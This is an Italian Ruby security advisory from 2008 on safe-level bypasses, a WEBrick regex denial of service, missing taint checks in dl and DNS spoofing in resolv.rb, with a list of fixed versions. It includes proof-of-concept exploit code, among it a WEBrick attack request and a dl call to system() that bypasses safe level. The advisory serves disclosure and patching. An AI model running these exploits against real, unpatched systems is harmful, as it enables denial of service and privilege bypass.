---
layout: news_post
title: "Multiple vulnerabilità in Ruby"
author: "Fabio Cevasco"
lang: it
---

Multiple vulnerabilità sono state scoperte in Ruby. Si raccomanda di eseguire un aggiornamento alle ultime versioni.

## Dettagli

Le seguenti vulnerabilità sono state scoperte.

### Molteplici vulnerabilità nel safe level

Molteplici vulnerabilità nel \_safe level\_ sono state scoperte:

* untrace\_var è permesso in safe level 4.

      trace_var(:$VAR) {|val| puts "$VAR = #{val}" }

      Thread.new do
       $SAFE = 4
       eval %q{
         proc = untrace_var :$VAR
         proc.first.call("aaa")
       }
      end.join

* $PROGRAM\_NAME può essere moficato in safe level 4.

      Thread.new do
       $SAFE = 4
       eval %q{$PROGRAM_NAME.replace "Hello, World!"}
      end.join

      $PROGRAM_NAME #=> "Hello, World!"

* Metodi non sicuri possono essere chiamati in safe level 1-3.

      class Hello
       def world
         Thread.new do
           $SAFE = 4
           msg = "Hello, World!"
           def msg.size
             self.replace self*10 # replace string
             1 # ritorna la dimensione sbagliata
           end
           msg
         end.value
       end
      end

      $SAFE = 1 # o 2, o 3
      s = Hello.new.world
      if s.kind_of?(String)
       puts s if s.size < 20 # Stampa una stringa la cui lunghezza è inferiore a 20
      end

* Syslog operations are permitted at safe level 4.

      require "syslog"

      Syslog.open

      Thread.new do
       $SAFE = 4
       eval %q{
         Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
         Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
         Syslog.info("masked")
         Syslog.close
       }
      end.join

Queste vulnerabilità sono state notificate da Keita Yamaguchi.

### Vulnerabilità DoS in WEBrick

WEBrick::HTTP::DefaultFileHandler è soggetto a richieste che occupano
tempi esponenziali dovute a un\'espressione regolare retroattiva in
WEBrick::HTTPUtils.split\_header\_value.

Server vulnerabile:

    require 'webrick'
    WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

Attack:

    require 'net/http'
    res = Net::HTTP.start("localhost", 2000) { |http|
      req = Net::HTTP::Get.new("/passwd")
      req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
      http.request(req)
    }
    p res

È possibile che questa richiesta abbia bisogno di un tempo
infinito.

Questa vulnerabilità è stata notificata da Christian Neukirchen.

### Mancanza di controlli di \_taintness\_ in dl
{: #label-3}

dl non controlla la \_taintness\_, e questo potrebbe permettere la
chiamata di funzioni pericolose.

    require 'dl'
    $SAFE = 1
    h = DL.dlopen(nil)
    sys = h.sym('system', 'IP')
    uname = 'uname -rs'.taint
    sys[uname]

Questa vulnerabilità è stata notificata da sheepman.

### Vulnerabilità di spoofing del DNS spoofing in resolv.rb

resolv.rb permette ad utenti remoti di mascherare le risposte del DNS.
Questo rischio può essere ridotto randomizzando le ID di transazione e
le porte sorgenti, così resolv.rb è stato corretto per fare proprio
questo.

* vedi anche: [CVE-2008-1447][1]

Questa vulnerabilità è stata notificata da Tanaka Akira.

## Versioni di Ruby vulnerabili

serie 1.8
: * 1\.8.5 e precedenti
  * 1\.8.6-p286 e precedenti
  * 1\.8.7-p71 e precedenti

serie 1.9
: * r18423 e precedenti

## Soluzione

serie 1.8
: Eseguire l\'agggiornamento a 1.8.6-p287 o 1.8.7-p72.

  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&gt;][2]
  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&gt;][3]

serie 1.9

: Eseguire un checkout dell\'ultima versione tramite Subversion.

      $ svn co https://git.ruby-lang.org/ruby.git/tree/?id=master ruby

Nota che un pacchetto che corregge questa vulnerabilità potrebbe essere
già disponibile attraverso il tuo software di package management.

## Crediti

Un sincero ringraziamento a Keita Yamaguchi, Christian Neukirchen,
sheepman, e Tanaka Akira per aver notificato questi problemi al Ruby
Security Team.

## Cambiamenti

* 2008-08-08 12:21 +09:00 Corretto il numero di revisione di Ruby 1.9.
* 2008-08-11 11:23 +09:00 Corretto il patchlevel di Ruby 1.8. vedi
  [L\'annuncio del rilascio di Ruby 1.8.7-p72 e 1.8.6-p287][4]



[1]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447
[2]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz
[3]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz
[4]: {{ site.url }}/it/news/2008/11/14/ruby-1-8-7-p72-and-1-8-6-p287-released/
